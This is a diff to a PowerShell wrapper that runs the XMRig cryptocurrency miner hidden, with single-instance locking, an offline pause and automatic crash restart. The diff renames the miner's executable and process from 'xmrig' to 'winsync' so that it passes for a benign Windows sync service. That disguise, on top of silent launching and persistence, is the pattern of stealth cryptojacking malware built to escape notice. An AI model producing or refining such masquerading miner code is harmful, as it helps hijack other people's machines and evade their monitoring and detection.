@@ -1,7 +1,7 @@
 # XMRig Silent Wrapper v5.1
 # Uses Windows named mutex for bulletproof single instance guarantee
 
-$exePath    = "C:\Program Files\XMRig\xmrig.exe"
+$exePath    = "C:\Program Files\XMRig\winsync.exe"
 $configPath = "C:\Program Files\XMRig\config.json"
 $lockFile   = "C:\ProgramData\XMRig\miner.lock"
 $lockDir    = "C:\ProgramData\XMRig"
@@ -50,7 +50,7 @@ try {
     }
 
     # ---- Kill any existing xmrig before starting fresh ----
-    Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
+    Stop-Process -Name "winsync" -Force -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 2
 
     # ---- Launch xmrig completely hidden ----
@@ -74,7 +74,7 @@ try {
         } catch {}
 
         if (-not $online) {
-            Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
+            Stop-Process -Name "winsync" -Force -ErrorAction SilentlyContinue
             while (-not $online) {
                 Start-Sleep -Seconds 15
                 try {
@@ -86,7 +86,7 @@ try {
         }
 
         # Crash recovery: restart if xmrig stopped unexpectedly
-        $running = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
+        $running = Get-Process -Name "winsync" -ErrorAction SilentlyContinue
         if (-not $running) {
             Start-Sleep -Seconds 5
             [System.Diagnostics.Process]::Start($pinfo) | Out-Null
